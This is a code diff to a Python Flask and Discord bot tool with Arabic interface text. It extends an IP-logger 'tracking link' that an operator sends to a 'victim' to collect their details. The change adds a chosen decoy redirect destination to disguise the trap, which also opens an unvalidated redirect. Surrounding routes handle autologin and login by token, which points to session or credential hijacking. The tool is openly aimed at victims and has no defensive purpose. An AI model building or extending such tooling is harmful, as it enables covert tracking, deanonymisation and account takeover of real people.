@@ -55,11 +55,8 @@ def autologin():
                     </html>
                     """
                     return html_page
-                else:
-                    return f"<h1>تم استقبال بيانات المنصة ({platform}) بنجاح!</h1><p>البيانات: {credential}</p>"
-    except Exception as e:
-        return f"❌ Error: {str(e)}", 500
-        
+    except Exception:
+        pass
     return "❌ Session expired or not found", 404
 
 @app.route('/track')
@@ -103,7 +100,8 @@ def track_visitor():
     except Exception:
         pass
 
-    return redirect("https://www.google.com", code=302)
+    redirect_target = request.args.get('to', 'https://www.google.com')
+    return redirect(redirect_target, code=302)
 
 def run():
     app.run(host='0.0.0.0', port=8080)
@@ -614,16 +612,17 @@ async def loginbytoken_command(interaction: discord.Interaction, platform: str, 
 
     await interaction.followup.send(embed=embed, view=view, ephemeral=True)
 
-@client.tree.command(name="link", description="توليد رابط تتبع (IP Logger) لجلب معلومات وزوار الضحية فوراً")
-async def generate_track_link(interaction: discord.Interaction):
+@client.tree.command(name="link", description="توليد رابط تتبع مع إمكانية تحديد وجهة تمويهية (مثل يوتيوب أو موقع)")
+@app_commands.describe(redirect_to="الرابط الذي سيتم توجيه الضحية إليه بعد سحب معلوماته (اختياري)")
+async def generate_track_link(interaction: discord.Interaction, redirect_to: str = "https://www.google.com"):
     if not interaction.response.is_done():
         await interaction.response.defer(thinking=True, ephemeral=True)
     
-    track_url = f"{HOST_URL}/track"
+    track_url = f"{HOST_URL}/track?to={requests.utils.quote(redirect_to, safe='')}"
     
     embed = discord.Embed(
-        title="🔗 رابط التتبع الجاهز للإنشاء",
-        description=f"أرسل هذا الرابط للضحية:\n`{track_url}`\n\nبمجرد أن يفتحه (من جوال أو كمبيوتر)، سيتم إرسال رسالة تنبيه فورية هنا بكافة تفاصيله!",
+        title="🔗 رابط التتبع المخصص جاهز",
+        description=f"الرابط المولد لإرساله:\n`{track_url}`\n\nالوجهة النهائية (التمويهية): `{redirect_to}`",
         color=0xFF5733
     )
     await interaction.followup.send(embed=embed, ephemeral=True)
